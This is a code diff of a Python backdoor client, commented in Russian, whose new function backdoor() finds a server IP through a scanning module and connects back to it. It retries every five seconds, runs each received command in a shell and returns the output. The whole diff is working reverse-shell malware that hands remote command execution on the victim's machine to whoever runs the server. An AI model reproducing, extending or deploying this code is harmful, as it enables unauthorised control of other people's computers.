@@ -4,8 +4,9 @@ import ctypes
 import time
 import subprocess as sp
 
-server = ('192.168.1.54', 11719) # IP и порт тот же, что и в серверной части
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+from Scanning import sscan
+
+
 
 # Функция будет выполнять команду в терминале/cmd.exe и возращать результат
 def run_command(command):
@@ -16,7 +17,7 @@ def run_command(command):
     return result.read()
 
 # Function connect to server
-def connect():
+def connect(sock, server):
     try:
         sock.connect(server)
         return True
@@ -24,33 +25,38 @@ def connect():
         return False
 
 # Connecting to server
-def while_connect():
+def while_connect(sock, server):
     connecting = True
 
     while connecting:
-        if connect():
+        if connect(sock, server):
             connecting = False
         else:
             time.sleep(5) # Подключение раз в 5 секунд, ахиренная оптимизация, отвечаю
 
-while_connect() # Коннект к серверу
+def backdoor():
+    ip = sscan()
+    server = (ip, 11719)  # IP и порт тот же, что и в серверной части
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-# Data exchange
-while True:
-    try:
-        command = sock.recv(4096).decode() # Получаем сообщение, которое отправил сервер
+    while_connect(sock, server)  # Коннект к серверу
 
-        if command == "exit":
-            break
-
-        else:
-            result = run_command(command) # Выполняем команду
-            length = str(len(result)).zfill(16)
-            sock.send((length + result).encode()) # Отправка результат
-    except:
+    # Data exchange
+    while True:
         try:
-            sock.send("\nexcept")
-        except:
-            pass
+            command = sock.recv(4096).decode()  # Получаем сообщение, которое отправил сервер
 
-sock.close()
+            if command == "exit":
+                break
+
+            else:
+                result = run_command(command)  # Выполняем команду
+                length = str(len(result)).zfill(16)
+                sock.send((length + result).encode())  # Отправка результат
+        except:
+            try:
+                sock.send("\nexcept")
+            except:
+                pass
+
+    sock.close()
